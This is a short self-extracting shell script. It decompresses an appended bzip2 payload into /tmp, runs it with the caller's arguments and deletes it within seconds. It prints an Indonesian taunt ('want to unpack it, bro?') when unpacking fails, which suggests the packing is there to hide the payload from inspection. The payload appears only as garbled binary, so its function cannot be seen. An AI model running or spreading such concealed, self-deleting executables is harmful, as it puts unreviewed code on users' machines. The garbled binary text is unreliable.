#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SY3(��  �_�D����N������@Β���,4"�!'��<�52l�4��Ƒ�4h4�����<F��䁧��4 �h  4dɣ�C414i�20�4�2a$D�2&4�x��zM4ɂi�h���4��s�t�~����,j9b��}��R����@m��������V v:E�`�R�WH���Y�&ت/DhM�D���$%Ȧ�bq'�6+B
���6��En� �-�PP�[�7Kq����+��r���%��X��je�n�8i9"���CK�z�L����-r7{:���̕k����߇@Xd)�2�f]�`�};�ewr�)�;M��Ix��95�!�Ĵɪh��$f��\}�O����LHa($�� e�n����j��E�M�s,�.�^~Fg;ͻB�C�2�����wr�8�n�#����	^]d�q���\]0[��MK�+Q���H�
U��'��aϴ/v�*Ffb��9�"��v�@��t'(u_m��̈́���-���*0����k�fcFi�U[�p��s*fԃ{���(�-�4(*q���F����ً!7�[go:����	�[���^�DӸ����ҭ	��*U��kR��br� 0%�T���o��@(�X��*>n��N�m��o���p�`��o���E ��S� Q�u�����
��g ���̨�6���.��'5n3G{�����0����5��EA�)Am�oEg)���c�!�=�Z�����L[���ҙf2����H�
eZ 